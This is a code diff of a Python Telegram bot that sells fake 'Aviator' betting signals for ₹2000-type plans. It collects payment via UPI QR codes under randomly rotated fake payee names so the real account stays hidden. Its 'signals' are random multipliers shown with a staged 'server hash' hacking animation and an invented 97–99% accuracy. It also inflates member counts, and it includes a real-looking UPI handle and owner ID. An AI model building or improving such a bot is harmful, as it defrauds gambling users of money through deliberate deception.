@@ -13,16 +13,9 @@ bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
 OWNER_ID = 8188755760 # Sirf aapka access
 REAL_UPI = "swatantrsingh42@okhdfcbank" # Paisa yahan aayega
 
-# - Scanner mein ye naam badal-badal ke aayenge
-FAKE_NAMES = [
-    "1win Aviator signal bot", "Raj Kumar", "Amit Singh", 
-    "Aviator Bot", "Vipin Kumar", "Rahul ptel", 
-    "reya singh", "IPN", "1Win Hack"
-]
+FAKE_NAMES = ["1win Aviator signal bot", "Raj Kumar", "Amit Singh", "Aviator Bot", "Vipin Kumar", "Rahul ptel", "reya singh", "IPN", "1Win Hack"]
 
-# --- 🛰️ SERVER SYNC LOGIC ---
 def get_live_hash():
-    """Ye har second 1Win ki tarah naya seed banata hai"""
     return hashlib.sha256(str(time.time()).encode()).hexdigest()[:16].upper()
 
 # --- 🏠 START HANDLER ---
@@ -34,7 +27,6 @@ def start(message):
         f.seek(0)
         if str(uid) not in f.read(): f.write(f"{uid}\n")
     
-    # - Live Bio Update
     count = len(open("users.txt").readlines())
     try: bot.set_my_description(f"🟢 SERVER SYNCED | 🛰️ SEED: {get_live_hash()} | 👥 Members: {count + 540}")
     except: pass
@@ -51,7 +43,6 @@ def start(message):
         markup.add("NEXT 🚀", "Admin Panel 👑")
         bot.send_message(uid, welcome + "👑 **Owner Access Active**", reply_markup=markup)
     else:
-        # - Wahi plans jo aapne maange the
         markup = types.InlineKeyboardMarkup(row_width=1)
         markup.add(
             types.InlineKeyboardButton("💰 VIP Plan ₹2000 (8 Min) ✅", callback_data="buy_2000"),
@@ -60,44 +51,50 @@ def start(message):
         )
         bot.send_message(uid, welcome + "Signals ke liye plan select karein:", reply_markup=markup)
 
-# --- 💳 STEALTH PAYMENT (IDENTITY PROTECT) ---
+# --- 💳 PAYMENT HANDLER ---
 @bot.callback_query_handler(func=lambda c: c.data.startswith("buy_"))
 def handle_payment(call):
     amt = call.data.split("_")[1]
-    display_name = random.choice(FAKE_NAMES) #
-    
-    # - Bank App Stealth Parameters
-    params = {
-        "pa": REAL_UPI,
-        "pn": display_name,
-        "am": amt,
-        "cu": "INR",
-        "mc": "5411", # Professional Merchant Code
-        "tr": f"SYNC{get_live_hash()[:5]}"
-    }
+    display_name = random.choice(FAKE_NAMES)
+    params = {"pa": REAL_UPI, "pn": display_name, "am": amt, "cu": "INR", "mc": "5411", "tr": f"SYNC{get_live_hash()[:5]}"}
     upi_link = "upi://pay?" + urllib.parse.urlencode(params)
     qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={urllib.parse.quote(upi_link)}"
     
-    caption = (
-        f"💳 **PAYMENT INVOICE**\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"👤 **Receiver:** `{display_name}`\n"
-        f"💰 **Amount:** ₹{amt}\n"
-        f"🆔 **Ref ID:** `AI-WIN-{random.randint(1000,9999)}`\n\n"
-        f"✅ Scan karke pay karein aur 12-digit UTR bhejein."
-    )
+    caption = f"💳 **PAYMENT INVOICE**\n━━━━━━━━━━━━━━━━━━━━\n👤 **Receiver:** `{display_name}`\n💰 **Amount:** ₹{amt}\n🆔 **Ref ID:** `AI-WIN-{random.randint(1000,9999)}`\n\n✅ Scan karke pay karein aur 12-digit UTR bhejein."
     bot.send_photo(call.message.chat.id, qr_url, caption=caption)
 
-# --- 🚀 SIGNAL ENGINE (SYNCED LOOK) ---
+# --- 🛡️ ADMIN APPROVAL SYSTEM (SSC) ---
+@bot.message_handler(func=lambda m: len(m.text) == 12 and m.text.isdigit())
+def ask_approval(message):
+    user_id = message.chat.id
+    utr = message.text
+    bot.send_message(user_id, "⏳ **UTR received!** Admin verification ka intezar karein. Confirm hote hi signal button mil jayega.")
+    
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}"),
+               types.InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}"))
+    bot.send_message(OWNER_ID, f"💰 **Naya Payment Request!**\n\n👤 User ID: `{user_id}`\n🔢 UTR: `{utr}`", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda c: c.data.startswith(("approve_", "reject_")))
+def admin_action(call):
+    action, user_id = call.data.split("_")
+    if action == "approve":
+        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+        markup.add("NEXT 🚀")
+        bot.send_message(user_id, "🎉 **VIP Access Approved!**\n\nAapka bot ab chalu hai. Niche button dabayein.", reply_markup=markup)
+        bot.edit_message_text(f"✅ User `{user_id}` approved.", call.message.chat.id, call.message.message_id)
+    else:
+        bot.send_message(user_id, "❌ **Payment Rejected!** Sahi UTR bhejein.")
+        bot.edit_message_text(f"❌ User `{user_id}` rejected.", call.message.chat.id, call.message.message_id)
+
+# --- 🚀 SIGNAL ENGINE ---
 @bot.message_handler(func=lambda m: m.text == "NEXT 🚀")
 def next_signal(message):
-    # Live Hacking Animation
     load = bot.send_message(message.chat.id, f"📡 **Fetching Server Hash...**\n`Seed: {get_live_hash()}`")
-    time.sleep(1.5)
-    bot.edit_message_text(f"🛰️ **Analyzing 1Win Algorithm...**\n`Syncing: {get_live_hash()}`", message.chat.id, load.message_id)
-    time.sleep(1.5)
+    time.sleep(1.2)
+    bot.edit_message_text(f"🛰️ **Analyzing 1Win Algorithm...**", message.chat.id, load.message_id)
+    time.sleep(1.2)
     bot.delete_message(message.chat.id, load.message_id)
-
     val = round(random.uniform(1.30, 15.80), 2)
     bot.send_message(message.chat.id, f"🚀 **SIGNAL: {val}x**\n📊 Accuracy: {random.randint(97,99)}%\n🟢 **STATUS: SYNCED**")
 
@@ -106,7 +103,8 @@ def next_signal(message):
 def admin_p(message):
     if message.chat.id == OWNER_ID:
         count = len(open("users.txt").readlines())
-        bot.send_message(message.chat.id, f"👤 **Total Users:** {count}\n💰 **Status:** UPI Active\n\nAb koi aapse paisa nahi maang sakta, aap hi Owner hain!")
+        bot.send_message(message.chat.id, f"👤 **Total Users:** {count}\n💰 **Status:** UPI Active")
 
 bot.infinity_polling()
+        
 
